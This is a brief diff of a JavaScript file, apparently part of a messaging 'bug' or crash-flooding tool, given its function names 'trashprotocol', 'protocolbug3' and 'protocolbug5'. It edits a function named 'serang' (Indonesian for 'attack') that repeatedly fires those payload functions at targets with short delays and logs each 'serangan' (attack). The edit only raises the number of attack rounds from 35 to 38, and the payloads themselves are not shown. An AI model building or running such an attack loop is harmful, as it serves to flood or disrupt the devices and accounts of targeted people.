@@ -337,7 +337,7 @@ function trashprotocol(target) {
 
 function serang(targets) {
   return new Promise(async resolve => {
-    for (let i = 1; i <= 35; i++) {
+    for (let i = 1; i <= 38; i++) {
       await protocolbug5();
       await tunggu(1500);
       await protocolbug3();
@@ -348,7 +348,7 @@ function serang(targets) {
       await tunggu(1500);
       await protocolbug3();
       console.log("serangan ke-" + i);
-      if (i == 35) {
+      if (i == 38) {
         resolve();
       }
     }
